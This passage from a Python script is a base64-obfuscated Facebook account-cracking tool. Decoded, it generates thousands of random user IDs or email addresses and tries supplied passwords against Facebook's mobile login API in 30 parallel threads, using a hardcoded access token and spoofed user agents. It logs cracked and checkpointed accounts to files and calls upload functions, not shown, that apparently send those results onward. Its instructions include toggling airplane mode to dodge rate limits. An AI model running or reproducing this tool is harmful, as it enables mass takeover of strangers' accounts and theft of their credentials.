cC50eHQiJShZKSkKCQkJCXByaW50KCIlcyBbIV0gSUYgTk8gUkVTVUxUIFRVUk4gT04gQUlSUExBTkUgTU9ERSA1IFNFQ09ORFNceDFiWzBtXG4iJShSKSkKCQkJCWZvciB1c2VyIGluIHNlbGYuaWQ6CgkJCQkJY29lZy5zdWJtaXQoc2VsZi5hcGksIHVzZXIsIGxpc3RwYXNzLnNwbGl0KCIsIikpCgkJCWV4aXQoIlxuXG4lcyBbI10gQ1JBQ0sgQ09NUExFVEUuLi4iJShHKSkKCQlleGNlcHQgRXhjZXB0aW9uIGFzIGU6ZXhpdChzdHIoZSkpCgkJCgkJCglkZWYgb2xkNF81KHNlbGYpOgoJCXggPSAxMTExMTEKCQl4eCA9IDk5OTk5OQoJCSNpZHggPSBpbnB1dCgiJXMgWytdIEVOVEVSIEEgRElHSVQgKDEtOSk6ICVzIiUoWSxHKSkKCQlpZHggPSByYW5kb20uY2hvaWNlKFsiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiXSkKCQlsaW1pdCA9IGludChpbnB1dCgiXDAzM1swOzkybSBbK10gRU5URVIgTElNSVQgXDAzM1swOzkxbSg1MDAwMCBNQVgpOiBcMDMzWzA7OTJtIikpCgkJaWYgKGxpbWl0KT41MDAwMDoKCQkJZXhpdCgiXG4lcyBbIV0gRE9OJ1QgQ1JPU1MgVEhFIExJTUlUIEJSTyA6KSIlKFIpKQoJCXRyeToKCQkJZm9yIG4gaW4gcmFuZ2UobGltaXQpOgoJCQkJXyA9IHJhbmRvbS5yYW5kaW50KHgseHgpCgkJCQlfXyA9IGlkeAoJCQkJc2VsZi5pZC5hcHBlbmQoX18rc3RyKF8pKQoJCQlwcmludCgiXDAzM1swOzkzbSBbK10gVE9UQUwgSUQgLT4gXDAzM1swOzkxbSVzXDAzM1swOzk3bSIlKGxlbihzZWxmLmlkKSkpIAoJCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgY29lZzoKCQkJCXByaW50KCJcbiVzIFshXSBVU0UgJXMsICVzKENPTU1BKSVzIEZPUiBTRVBBUkFUT1IgIiUoWSxHLEIsWSkpCgkJCQlwcmludCgiJXMgRVhBTVBMRSA6ICVzMTIzNDU2LDEyMzQ1NjcsMTIzNDU2Nzg5IiUoWSxHKSkgCgkJCQlsaXN0cGFzcyA9IGlucHV0KCIlcyBbP10gRU5URVIgUEFTU1dPUkQgOiVzICIlKFksRykpCgkJCQlpZiBsZW4obGlzdHBhc3MpPD01OgoJCQkJCWV4aXQoIlxuJXMgWyFdIFBBU1NXT1JEIE1JTklNVU0gNiBDSEFSQUNURVJTIiUoUikpCgkJCQlwcmludCgiJXMgWypdIENSQUNLIFdJVEggUEFTU1dPUkQgLT4gW1wwMzNbMDs5MW0lc1wwMzNbMDs5M21dIiUoWSxsaXN0cGFzcykpCgkJCQlwcmludCgiXG4lcyBbK10gT0sgUkVTVUxUUyBTQVZFRCBJTiAtPiBvay50eHQiJShHKSkKCQkJCXByaW50KCIlcyBbK10gQ1AgUkVTVUxUUyBTQVZFRCBJTiAtPiBjcC50eHQiJShZKSkKCQkJCXByaW50KCIlcyBbIV0gSUYgTk8gUkVTVUxUIFRVUk4gT04gQUlSUExBTkUgTU9ERSA1IFNFQ09ORFNceDFiWzBtXG4iJShSKSkKCQkJCWZvciB1c2VyIGluIHNlbGYuaWQ6CgkJCQkJY29lZy5zdWJtaXQoc2VsZi5hcGksIHVzZXIsIGxpc3RwYXNzLnNwbGl0KCIsIikpCgkJCWV4aXQoIlxuXG4lcyBbI10gQ1JBQ0sgQ09NUExFVEUuLi4iJShHKSkKCQlleGNlcHQgRXhjZXB0aW9uIGFzIGU6ZXhpdChzdHIoZSkpCgkJCgkJCglkZWYgb2xkNF81KHNlbGYpOgoJCXggPSAxMTExMTEKCQl4eCA9IDk5OTk5OQoJCSNpZHggPSBpbnB1dCgiJXMgWytdIEVOVEVSIEEgRElHSVQgKDEtOSk6ICVzIiUoWSxHKSkKCQlpZHggPSByYW5kb20uY2hvaWNlKFsiMSIsICIyIiwgIjMiLCAiNCIsICI1IiwgIjYiLCAiNyIsICI4IiwgIjkiXSkKCQlsaW1pdCA9IGludChpbnB1dCgiXDAzM1swOzkybSBbK10gRU5URVIgTElNSVQgXDAzM1swOzkxbSgxMDAwMCBNQVgpOiBcMDMzWzA7OTJtIikpCgkJaWYgKGxpbWl0KT4xMDAwMDoKCQkJZXhpdCgiXG4lcyBbIV0gRE9OJ1QgQ1JPU1MgVEhFIExJTUlUIEJSTyA6KSIlKFIpKQoJCXRyeToKCQkJZm9yIG4gaW4gcmFuZ2UobGltaXQpOgoJCQkJXyA9IHJhbmRvbS5yYW5kaW50KHgseHgpCgkJCQlfXyA9IGlkeAoJCQkJc2VsZi5pZC5hcHBlbmQoX18rc3RyKF8pKQoJCQlwcmludCgiXDAzM1swOzkzbSBbK10gVE9UQUwgSUQgLT4gXDAzM1swOzkxbSVzXDAzM1swOzk3bSIlKGxlbihzZWxmLmlkKSkpIAoJCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgY29lZzoKCQkJCXByaW50KCJcbiVzIFshXSBVU0UgJXMsICVzKENPTU1BKSVzIEZPUiBTRVBBUkFUT1IgIiUoWSxHLEIsWSkpCgkJCQlwcmludCgiJXMgRVhBTVBMRSA6ICVzMTIzNDU2LDEyMzQ1NjcsMTIzNDU2Nzg5IiUoWSxHKSkgCgkJCQlsaXN0cGFzcyA9IGlucHV0KCIlcyBbP10gRU5URVIgUEFTU1dPUkQgOiVzICIlKFksRykpCgkJCQlpZiBsZW4obGlzdHBhc3MpPD01OgoJCQkJCWV4aXQoIlxuJXMgWyFdIFBBU1NXT1JEIE1JTklNVU0gNiBDSEFSQUNURVJTIiUoUikpCgkJCQlwcmludCgiJXMgWypdIENSQUNLIFdJVEggUEFTU1dPUkQgLT4gW1wwMzNbMDs5MW0lc1wwMzNbMDs5M21dIiUoWSxsaXN0cGFzcykpCgkJCQlwcmludCgiXG4lcyBbK10gT0sgUkVTVUxUUyBTQVZFRCBJTiAtPiBvay50eHQiJShHKSkKCQkJCXByaW50KCIlcyBbK10gQ1AgUkVTVUxUUyBTQVZFRCBJTiAtPiBjcC50eHQiJShZKSkKCQkJCXByaW50KCIlcyBbIV0gSUYgTk8gUkVTVUxUIFRVUk4gT04gQUlSUExBTkUgTU9ERSA1IFNFQ09ORFNceDFiWzBtXG4iJShSKSkKCQkJCWZvciB1c2VyIGluIHNlbGYuaWQ6CgkJCQkJY29lZy5zdWJtaXQoc2VsZi5hcGksIHVzZXIsIGxpc3RwYXNzLnNwbGl0KCIsIikpCgkJCWV4aXQoIlxuXG4lcyBbI10gQ1JBQ0sgQ09NUExFVEUuLi4iJShHKSkKCQlleGNlcHQgRXhjZXB0aW9uIGFzIGU6ZXhpdChzdHIoZSkpCgoKCWRlZiBlbWFpbChzZWxmKToKCQl4ID0gMTExCgkJeHggPSA5OTkKCQluYW0gPSBpbnB1dCgiJXMgWz9dIFRZUEUgQSBOQU1FICVzKEVYOiBSaXlhZCk6ICIlKFksRykpCgkJbmFtID0gbmFtLnJlcGxhY2UoIiAiLCAiIikKCQlwcmludCgiJXMgRVhBTVBMRSAgOiAlc0BnbWFpbC5jb20sIEB5YWhvby5jb20sIEBob3RtYWlsLmNvbSBFVEMiJShZLEcpKQoJCWlkeCA9IGlucHV0KCIlcyBET01BSU4gIDogIiUoQikpCgkJbGltaXQgPSBpbnQoaW5wdXQoIlwwMzNbMDs5Mm0gWytdIEVOVEVSIExJTUlUIFwwMzNbMDs5MW0oNTAwMDAgTUFYKTogXDAzM1swOzkybSIpKQoJCWlmIChsaW1pdCk+NTAwMDA6CgkJCWV4aXQoIlxuJXMgWyFdIERPTidUIENST1NTIFRIRSBMSU1JVCBCUk8gOikiJShSKSkKCQl0cnk6CgkJCWZvciBuIGluIHJhbmdlKGxpbWl0KToKCQkJCV8gPSByYW5kb20ucmFuZGludCh4LHh4KQoJCQkJX18gPSBpZHgKCQkJCV9fXyA9IG5hbQoJCQkJc2VsZi5pZC5hcHBlbmQoX19fK3N0cihfKStfXykKCQkJcHJpbnQoIlwwMzNbMDs5M20gWytdIFRPVEFMIElEIC0+IFwwMzNbMDs5MW0lc1wwMzNbMDs5N20iJShsZW4oc2VsZi5pZCkpKSAKCQkJd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGNvZWc6CgkJCQlwcmludCgiXG4lcyBbIV0gVVNFICVzLCAlcyhDT01NQSklcyBGT1IgU0VQQVJBVE9SICIlKFksRyxCLFkpKQoJCQkJcHJpbnQoIiVzIEVYQU1QTEUgOiAlczEyMzQ1NiwxMjM0NTY3LDEyMzQ1Njc4OSIlKFksRykpIAoJCQkJbGlzdHBhc3MgPSBpbnB1dCgiIFs/XSBFTlRFUiBQQVNTV09SRCA6ICIpCgkJCQlpZiBsZW4obGlzdHBhc3MpPD01OgoJCQkJCWV4aXQoIlxuJXMgWyFdIFBBU1NXT1JEIE1JTklNVU0gNiBDSEFSQUNURVJTIiUoUikpCgkJCQlwcmludCgiJXMgWypdIENSQUNLIFdJVEggUEFTU1dPUkQgLT4gW1wwMzNbMDs5MW0lc1wwMzNbMDs5M21dIiUoWSxsaXN0cGFzcykpCgkJCQlwcmludCgiXG4lcyBbK10gT0sgUkVTVUxUUyBTQVZFRCBJTiAtPiBvay50eHQiJShHKSkKCQkJCXByaW50KCIlcyBbK10gQ1AgUkVTVUxUIFNBVkVEIElOIC0+IGNwLnR4dCIlKFkpKQoJCQkJcHJpbnQoIiVzIFshXSBJRiBOTyBSRVNVTFQgVFVSTiBPTiBBSVJQTEFORSBNT0RFIDUgU0VDT05EU1x4MWJbMG1cbiIlKFIpKQoJCQkJZm9yIHVzZXIgaW4gc2VsZi5pZDoKCQkJCQljb2VnLnN1Ym1pdChzZWxmLmFwaSwgdXNlciwgbGlzdHBhc3Muc3BsaXQoIiwiKSkKCQkJZXhpdCgiXG5cbiVzIFsjXSBDUkFDSyBDT01QTEVURS4uLiIlKEcpKQoJCWV4Y2VwdCBFeGNlcHRpb24gYXMgZTpleGl0KHN0cihlKSkKCQkKCQkKCglkZWYgYXBpKHNlbGYsIHVpZCwgcHd4KToKCQl1YSA9IHJhbmRvbS5jaG9pY2UoWwoJCQkiRGFsdmlrLzEuNi4wIChMaW51eDsgVTsgQW5kcm9pZCA0LjQuMjsgTlg1NSBCdWlsZC9LT1Q1NTA2KSBbRkJBTi9GQjRBO0ZCQVYvMTA2LjAuMC4yNi42ODtGQkJWLzQ1OTA0MTYwO0ZCRE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTE5MjB9O0ZCTEMvaXRfSVQ7RkJSVi80NTkwNDE2MDtGQkNSL1Bvc3RlTW9iaWxlO0ZCTUYvYXN1cztGQkJEL2FzdXM7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvQVNVU19aMDA3O0ZCU1YvNS4wO0ZCT1AvMTtGQkNBL3g4Njphcm1lYWJpLXY3YTtdIiwgCgkJCSJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL2l0X0lUO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XSIKCQkJIk9wZXJhLzkuODAgKEFuZHJvaWQ7IE9wZXJhIE1pbmkvMzIuMC4yMjU0Lzg1LiBVOyBpZCkgUHJlc3RvLzIuMTIuNDIzIFZlcnNpb24vMTIuMTYnO10iCgkJCSJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTE7IFJNWDIxOTUpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Mi4wLjQ1MTUuMTMxIE1vYmlsZSBTYWZhcmkvNTM3LjM2O10iCgkJXSkKCQlzeXMuc3Rkb3V0LndyaXRlKAoJCQkiXHJcciAlc1s+X10gW0FIQURfT0xEXSA6ICVzLyVzIC0+IFwwMzNbMDs5Mm0gW09LOiVzIF0tIFwwMzNbMDs5MW1bQ1A6JXMgXSIlKEIsc2VsZi5sb29wLCBsZW4oc2VsZi5pZCksIGxlbihzZWxmLm9rKSwgbGVuKHNlbGYuY3ApKQoJCSk7IHN5cy5zdGRvdXQuZmx1c2goKQoJCWZvciBwdyBpbiBwd3g6CgkJCXB3ID0gcHcubG93ZXIoKQoJCQlzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkKCQkJaGVhZGVycyA9IHsKCQkJCSJ4LWZiLWNvbm5lY3Rpb24tYmFuZHdpZHRoIjogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwMDAwLjAsIDMwMDAwMDAwLjApKSwgCgkJCQkieC1mYi1zaW0taG5pIjogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwLCA0MDAwMCkpLCAKCQkJCSJ4LWZiLW5ldC1obmkiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsIDQwMDAwKSksIAoJCQkJIngtZmItY29ubmVjdGlvbi1xdWFsaXR5IjogIkVYQ0VMTEVOVCIsCgkJCQkieC1mYi1jb25uZWN0aW9uLXR5cGUiOiAiY2VsbC5DVFJhZGlvQWNjZXNzVGVjaG5vbG9neUhTRFBBIiwKCQkJCSJ1c2VyLWFnZW50IjogdWEsIAoJCQkJImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLCAKCQkJCSJ4LWZiLWh0dHAtZW5naW5lIjogIkxpZ2VyIgoJCQl9CgkJCXJlc3BvbnNlID0gc2VzLmdldCgiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/Zm9ybWF0PWpzb24mZW1haWw9IitzdHIodWlkKSsiJnBhc3N3b3JkPSIrc3RyKHB3KSsiJmNyZWRlbnRpYWxzX3R5cGU9ZGV2aWNlX2Jhc2VkX2xvZ2luX3Bhc3N3b3JkJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJmVycm9yX2RldGFpbF90eXBlPWJ1dHRvbl93aXRoX2Rpc2FibGVkJnNvdXJjZT1kZXZpY2VfYmFzZWRfbG9naW4mbWV0YV9pbmZfZmJtZXRhPSUyMCZjdXJyZW50bHlfbG9nZ2VkX2luX3VzZXJpZD0wJm1ldGhvZD1HRVQmbG9jYWxlPWVuX1VTJmNsaWVudF9jb3VudHJ5X2NvZGU9VVMmZmJfYXBpX2NhbGxlcl9jbGFzcz1jb20uZmFjZWJvb2suZm9zLmhlYWRlcnN2Mi5mYjRhb3JjYS5IZWFkZXJzVjJDb25maWdGZXRjaFJlcXVlc3RIYW5kbGVyJmFjY2Vzc190b2tlbj0zNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzImZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lPWF1dGhlbnRpY2F0ZSZjcGw9dHJ1ZSIsIGhlYWRlcnM9aGVhZGVycykgCgkJCWlmICJzZXNzaW9uX2tleSIgaW4gcmVzcG9uc2UudGV4dCBhbmQgIkVBQUEiIGluIHJlc3BvbnNlLnRleHQ6CgkJCQlwcmludCgiXHIgXDAzM1swOzkybVtPS10gJXN8JXNcMDMzWzA7OTdtICAgICAgICAgIiUodWlkLCBwdykpCgkJCQlzZWxmLm9rLmFwcGVuZCgiJXN8JXMiJSh1aWQsIHB3KSkKCQkJCW9wZW4oIm9rLnR4dCIsImEiKS53cml0ZSgiIFtPS10gJXN8JXNcbiIlKHVpZCwgcHcpKQoJCQkJdXBsb2Fkb2tzKCkKCQkJCWJyZWFrCgkJCWVsaWYgInd3dy5mYWNlYm9vay5jb20iIGluIHJlc3BvbnNlLmpzb24oKVsiZXJyb3JfbXNnIl06CgkJCQlwcmludCgiXHIgXDAzM1swOzkxbVtBSEFELUNQXSAlc3wlc1wwMzNbMDs5N20gICAgICAgICAiJSh1aWQsIHB3KSkKCQkJCXNlbGYuY3AuYXBwZW5kKCIlc3wlcyIlKHVpZCwgcHcpKQoJCQkJb3BlbigiY3AudHh0IiwiYSIpLndyaXRlKCIgW0NQXSAlc3wlc1xuIiUodWlkLCBwdykpCgkJCQl1cGxvYWRjcHMoKQoJCQkJYnJlYWsKCQkJZWxzZToKCQkJCWNvbnRpbnVlCgoJCXNlbGYubG9vcCArPTEKCmlmIGxlbihzeXMuYXJndikgPT0gMjoKCWlmIHN5cy5hcmd2WzFdID09ICItLWhlbHAiIG9yIHN5cy5hcmd2WzFdID09ICItaCI6CgkJaGVscG5vdGUoKQoJZWxzZToKCQlNYWluKCkKCnRyeTpNYWluKCkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOmV4aXQoc3RyKGUpKQo="))